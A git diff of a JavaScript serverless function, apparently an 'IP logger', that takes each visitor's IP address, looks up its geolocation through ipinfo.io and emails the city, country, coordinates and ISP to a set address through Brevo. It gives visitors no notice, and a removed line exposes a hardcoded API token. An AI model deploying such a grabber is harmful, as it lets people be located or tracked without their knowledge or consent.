@@ -1,21 +1,28 @@
 const axios = require('axios');
 
-// Simpan IP di memory global
-let ipList = global.ipList || [];
-global.ipList = ipList;
-
-const saveIp = (ip) => {
-  if (!ipList.includes(ip)) {
-    ipList.push(ip);
-  }
-};
-
 exports.handler = async (event) => {
   try {
     const ip = event.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
-    saveIp(ip);
 
-    const { data } = await axios.get(`https://ipinfo.io/${ip}?token=bf2e607b007c45`);
+    const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${process.env.IPINFO_TOKEN}`);
+
+    // Kirim email via Brevo API
+    await axios.post('https://api.brevo.com/v3/smtp/email', {
+      sender: { name: "IP Logger", email: process.env.SENDER_EMAIL },
+      to: [{ email: process.env.RECEIVER_EMAIL }],
+      subject: "New IP Logged",
+      textContent: `IP: ${data.ip}
+Region: ${data.region}
+City: ${data.city}
+Country: ${data.country}
+Location: ${data.loc}
+Org: ${data.org}`
+    }, {
+      headers: {
+        'api-key': process.env.ZYNN_KEY,
+        'Content-Type': 'application/json'
+      }
+    });
 
     return {
       statusCode: 200,
